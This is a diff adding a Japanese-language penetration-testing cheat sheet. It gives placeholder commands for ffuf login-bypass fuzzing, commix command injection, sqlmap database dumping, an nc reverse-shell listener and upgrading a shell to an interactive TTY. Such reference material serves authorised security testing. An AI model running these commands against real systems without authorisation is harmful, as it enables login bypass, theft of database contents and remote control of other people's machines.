@@ -1,0 +1,28 @@
+% 侵入, ffuf
+
+# ffuf: ログインの回避を試す（Auth_Bypass などを送る）
+ffuf -X <http_method> -w <wl_bypass>:FUZZ -u "<login_url>" -t 100 -c -ic -fs <fs>
+
+
+% 侵入, commix
+
+# commix: 保存したリクエストでコマンドインジェクションを試す
+commix -r "$(realpath <reqfile>)" --batch
+
+
+% 侵入, sqlmap
+
+# sqlmap: 保存したリクエストで流す（DB の一覧・テーブルの一覧（-D）・列の一覧・中身を抜く（-D -T）・そのほかから選ぶ）
+sqlmap -r <reqfile> --threads 10 --batch <sqlmap_lvl> <sqlmap_act>
+
+
+% 侵入, nc
+
+# nc: リバースシェルを受ける（rlwrap で行編集・履歴が効く）
+rlwrap nc -nlvvp <listen_port>
+
+
+% 侵入, TTY
+
+# TTY: 相手の dumb shell を対話シェルにする（python3・python の pty・script から選ぶ）
+<tty>
